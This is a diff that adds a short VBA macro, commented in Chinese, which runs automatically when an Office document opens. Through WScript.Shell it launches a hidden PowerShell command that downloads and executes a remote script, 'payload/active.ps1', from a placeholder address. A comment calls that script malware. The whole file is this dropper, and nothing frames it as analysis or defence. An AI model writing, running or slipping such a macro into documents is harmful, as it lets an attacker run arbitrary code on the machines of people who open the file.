@@ -1,0 +1,12 @@
+Sub AutoOpen()
+    ' 使用WScript.Shell对象执行命令
+    Dim ws As Object
+    Set ws = CreateObject("WScript.Shell")
+
+    ' PowerShell命令下载并执行恶意软件
+    Dim strCmd As String
+    strCmd = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP地址/payload/active.ps1')"
+
+    ' 执行命令
+    ws.Run strCmd, 0, False
+End Sub
